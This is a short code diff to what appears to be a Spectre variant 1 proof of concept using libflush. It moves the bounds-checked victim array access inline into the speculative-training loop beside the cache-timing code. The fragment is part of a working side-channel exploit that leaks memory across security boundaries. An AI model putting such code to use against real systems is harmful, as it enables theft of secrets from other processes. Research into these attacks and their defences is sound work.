@@ -15,12 +15,6 @@ uint32_t   ALIGN_CACHE array1_size = sizeof(array1);
 uint8_t    ALIGN_CACHE array2[256 * 512];
 uint8_t    ALIGN_CACHE padding[1024];
 
-void victim_function(size_t x) {
-  if (x < array1_size) {
-    array2[array1[x] * 512] = 0;
-  }
-}
-
 /********************************************************************
 Analysis code
 ********************************************************************/
@@ -88,8 +82,9 @@ void readMemoryByte(libflush_session_t* libflush_session, const void* target_ptr
       x = training_x ^ (x & (malicious_x ^ training_x));
 
       /* Call the victim! */
-      victim_function(x);
-
+      if (x < array1_size) {
+        array2[array1[x] * 512] = 0;
+      }
     }
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
